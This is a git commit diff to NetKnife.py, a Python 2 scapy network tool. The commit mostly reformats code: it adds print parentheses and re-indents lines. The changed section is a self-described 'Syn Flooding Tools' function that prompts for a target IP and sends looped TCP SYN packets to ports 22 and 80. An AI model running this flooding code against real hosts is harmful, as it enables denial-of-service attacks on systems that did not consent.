05ff0f5c35c35a67cb2a34823319d253ca1f30e5
AmirHoseinTangsiriNET <64230943+AmirHoseinTnagsiriNET@users.noreply.github.com>
2020-06-12 01:08:45 +0430

    Update NetKnife.py

--- NetKnife.py
+++ NetKnife.py
@@ -6,13 +6,13 @@ from scapy.all import *
 import hashlib
 
 os.system("clear")
-print Fore.RED + """
+print Fore.RED + ("""
 '|.   '|'           .   '||'  |'            ||    .'|.            
  |'|   |    ....  .||.   || .'    .. ...   ...  .||.     ....     
  | '|. |  .|...||  ||    ||'|.     ||  ||   ||   ||    .|...||  
  |   |||  ||       ||    ||  ||    ||  ||   ||   ||    ||       
 .|.   '|   '|...'  '|.' .||.  ||. .||. ||. .||. .||.    '|...' 
-"""
+""")
 def printer(Print):
     for c in Print + '\n':
         sys.stdout.write(c)
@@ -138,21 +138,21 @@ def Syn():
       #   #   #  # # #       #      #    # #    # #    # #      #####  
 	#     #   #   #   ## #       #      #    # #    # #    # #      #   #  
 	 #####    #   #    # #       ######  ####   ####  #####  ###### #    # 
-		"""
+	"""
 
-    print "This The Syn Flooding Tools With IP Changer "
-    TargetIP = raw_input("Plese Enter The Target IP or Domain: ")
-    print Fore.RED + "Field Values of packet send"
+        print "This The Syn Flooding Tools With IP Changer"
+        TargetIP = raw_input("Plese Enter The Target IP or Domain: ")
+        print Fore.RED + "Field Values of packet send"
 
-    p=IP(dst=TargetIP,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
-    ls(p)
-    print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
-    ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
-    print "Summary of answered & unanswered packets"
-    ans.summary()
-    unans.summary()
-    print "source port flags in response"
-    ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
+        p=IP(dst=TargetIP,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
+        ls(p)
+        print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
+        ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
+        print "Summary of answered & unanswered packets"
+        ans.summary()
+        unans.summary()
+        print "source port flags in response"
+        ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
 
 
 
